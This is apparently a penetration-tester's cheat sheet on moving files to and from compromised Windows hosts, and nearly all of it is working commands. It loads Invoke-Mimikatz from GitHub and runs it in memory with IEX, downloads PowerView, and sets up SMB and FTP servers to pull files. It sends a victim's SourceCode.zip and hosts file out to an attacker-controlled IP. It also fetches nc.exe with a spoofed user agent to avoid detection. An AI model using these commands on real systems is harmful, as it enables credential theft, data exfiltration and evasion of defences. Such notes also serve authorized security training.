# Collection

## Program Upload

```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

### Using IEX

```
# Using IEX
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
# Pipeline Input
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Using Invoke-Webrequest

<pre><code><strong>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
</strong></code></pre>

{% hint style="info" %}
You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
{% endhint %}

### PowerShell Base64 Encode & Decode

```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### Base64 decoding in Linux

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

### Using SMB

#### Creating the SMB Server

```shell-session
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user acuity -password SuperStr00ng!
```

#### Mounting the SMB Share on Windows

```
net use X: \\192.168.220.133\share /user:acuity SuperStr00ng!
```

#### Downloading from SMB Share

```
copy \\$IP\smbshare\file.exe .
```

#### Uploading to SMB Share

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

### Using FTP

**Installing the FTP Server Python3 Module**

```
sudo pip3 install pyftpdlib
```

**Setting up a Python3 FTP Server**

```
sudo python3 -m pyftpdlib --port 21
```

#### Transfering Files from FTP using PowerShell

```
 (New-Object Net.WebClient).DownloadFile('ftp://$IP/file.txt', 'C:\Users\Public\file.txt')
```

**Create a Command File for the FTP Client and Download the Target File**

```
C:\acuity> echo open 192.168.49.128 > ftpcommand.txt
C:\acuity> echo USER anonymous >> ftpcommand.txt
C:\acuity> echo binary >> ftpcommand.txt
C:\acuity> echo GET file.txt >> ftpcommand.txt
C:\acuity> echo bye >> ftpcommand.txt
C:\acuity> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\acuity>more file.txt
This is a test file
```

### Uploading Files via Powershell

```
(New-Object Net.WebClient).UploadFile('ftp://$IP/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Evasion Tactics

<pre><code><strong># Listing available user agents
</strong>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
<strong># Changing user agent to Chrome
</strong>UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
# Downloading file with spoofed user agent
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
</code></pre>
